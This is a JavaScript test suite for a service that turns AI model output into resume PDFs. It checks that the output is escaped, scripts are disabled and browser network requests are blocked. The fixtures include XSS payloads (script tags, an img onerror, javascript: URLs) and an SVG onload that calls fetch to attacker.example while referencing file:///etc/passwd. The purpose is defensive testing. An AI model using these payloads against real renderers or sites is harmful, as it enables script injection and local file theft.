const { test, beforeEach } = require("node:test")
const assert = require("node:assert/strict")
const Module = require("node:module")
const path = require("node:path")

process.env.GOOGLE_GENAI_API_KEY = "pdf-generation-security-test-key"

const captured = {
    aiRequest: null,
    launchOptions: null,
    pageCalls: [],
    listeners: {},
    closeCount: 0,
    pdfError: null,
    setContentError: null
}

let modelData = {
    fullName: "Candidate",
    contactDetails: ["candidate@example.test"],
    summary: "Experienced candidate",
    sections: [{ heading: "Experience", entries: [{ title: "Engineer", bullets: ["Built systems"] }] }]
}

class FakeGoogleGenAI {
    constructor() {
        this.models = {
            generateContent: async request => {
                captured.aiRequest = request
                return { text: JSON.stringify(modelData) }
            }
        }
    }
}

const fakePage = {
    async setContent(html, options) {
        captured.pageCalls.push({ method: "setContent", html, options })
        if (captured.setContentError) throw captured.setContentError
    },
    async setJavaScriptEnabled(enabled) {
        captured.pageCalls.push({ method: "setJavaScriptEnabled", enabled })
    },
    async setRequestInterception(enabled) {
        captured.pageCalls.push({ method: "setRequestInterception", enabled })
    },
    on(event, handler) {
        captured.listeners[event] = handler
        captured.pageCalls.push({ method: "on", event })
    },
    async pdf(options) {
        captured.pageCalls.push({ method: "pdf", options })
        if (captured.pdfError) throw captured.pdfError
        return Buffer.from("%PDF-test")
    }
}

const fakePuppeteer = {
    async launch(options) {
        captured.launchOptions = options
        return {
            async newPage() { return fakePage },
            async close() { captured.closeCount += 1 }
        }
    }
}

const servicePath = path.resolve(__dirname, "../src/services/ai.service.js")
const originalLoad = Module._load
Module._load = function (request, parent, isMain) {
    if (request === "@google/genai") return { GoogleGenAI: FakeGoogleGenAI }
    if (request === "puppeteer") return fakePuppeteer
    return originalLoad.call(this, request, parent, isMain)
}
delete require.cache[servicePath]
const { generateResumePdf } = require(servicePath)
Module._load = originalLoad

beforeEach(() => {
    captured.aiRequest = null
    captured.launchOptions = null
    captured.pageCalls = []
    captured.listeners = {}
    captured.closeCount = 0
    captured.pdfError = null
    captured.setContentError = null
    modelData = {
        fullName: "Candidate",
        contactDetails: ["candidate@example.test"],
        summary: "Experienced candidate",
        sections: [{ heading: "Experience", entries: [{ title: "Engineer", bullets: ["Built systems"] }] }]
    }
})

async function generate() {
    return generateResumePdf({ resume: "Resume evidence", selfDescription: "Profile", jobDescription: "Role" })
}

function setContentCall() {
    return captured.pageCalls.find(call => call.method === "setContent")
}

test("requests structured resume data and rejects the old raw-HTML response shape", async () => {
    modelData = { html: "<script>run()</script>" }

    await assert.rejects(generate(), /schema validation/i)
    assert.ok(captured.aiRequest.config.responseSchema.properties.fullName)
    assert.equal(captured.aiRequest.config.responseSchema.properties.html, undefined)
    assert.equal(setContentCall(), undefined)
})

test("renders model output as structured text, not executable or attacker-controlled markup", async () => {
    modelData.fullName = '<script>window.pwned=true</script>'
    modelData.sections[0].entries[0].bullets = ['<img src=x onerror="window.pwned=true">']

    await generate()

    const rendered = setContentCall().html
    assert.doesNotMatch(rendered, /<script\b/i)
    assert.doesNotMatch(rendered, /<[a-z][^>]*\bon\w+\s*=/i)
    assert.doesNotMatch(rendered, /<img\b/i)
    assert.match(rendered, /&lt;script/i)
    assert.match(rendered, /&lt;img/i)
})

test("renders malicious URLs and SVG payloads as text, never as resource markup", async () => {
    modelData.contactDetails = ["https://attacker.example/pixel", "javascript:alert(1)"]
    modelData.sections[0].entries[0].bullets = ['<svg onload="fetch(\'https://attacker.example/x\')"><image href="file:///etc/passwd"></image></svg>']

    await generate()

    const rendered = setContentCall().html
    assert.doesNotMatch(rendered, /<svg\b|<image\b/i)
    assert.doesNotMatch(rendered, /<[a-z][^>]*\b(?:src|href)\s*=/i)
    assert.doesNotMatch(rendered, /<[a-z][^>]*\bon\w+\s*=/i)
    assert.match(rendered, /&lt;svg/i)
})

test("rejects oversized model output before opening a browser page", async () => {
    modelData.summary = "x".repeat(64 * 1024)

    await assert.rejects(generate(), /too large|size limit/i)
    assert.equal(captured.pageCalls.some(call => call.method === "setContent"), false)
})

test("uses a bounded document-loading timeout instead of waiting indefinitely for network idle", async () => {
    await generate()

    const options = setContentCall().options
    assert.ok(Number.isFinite(options?.timeout) && options.timeout > 0 && options.timeout <= 15_000)
    assert.notEqual(options?.waitUntil, "networkidle0")
    assert.ok(captured.launchOptions.timeout > 0 && captured.launchOptions.timeout <= 15_000)
})

test("disables JavaScript in the PDF page", async () => {
    await generate()

    assert.ok(captured.pageCalls.some(call => call.method === "setJavaScriptEnabled" && call.enabled === false))
    assert.match(setContentCall().html, /Content-Security-Policy" content="default-src 'none'/)
})

test("blocks browser network requests while generating the PDF", async () => {
    await generate()

    assert.ok(captured.pageCalls.some(call => call.method === "setRequestInterception" && call.enabled === true))
    assert.equal(typeof captured.listeners.request, "function")
    for (const url of ["https://attacker.example/pixel", "file:///etc/passwd"]) {
        let aborted = false
        await captured.listeners.request({
            url: () => url,
            abort: async () => { aborted = true },
            continue: async () => assert.fail("untrusted PDF request must not be continued")
        })
        assert.equal(aborted, true, `${url} must be blocked`)
    }
})

test("closes the browser when page setup fails", async () => {
    captured.setContentError = new Error("page setup failed")

    await assert.rejects(generate(), /page setup failed/)
    assert.equal(captured.closeCount, 1)
})

test("closes the browser when PDF rendering fails", async () => {
    captured.pdfError = new Error("pdf rendering failed")

    await assert.rejects(generate(), /pdf rendering failed/)
    assert.equal(captured.closeCount, 1)
})

test("rejects oversized input before making a model request", async () => {
    await assert.rejects(generateResumePdf({ resume: "x".repeat(100_001), selfDescription: "", jobDescription: "" }), /size limit/i)
    assert.equal(captured.aiRequest, null)
    assert.equal(captured.closeCount, 0)
})
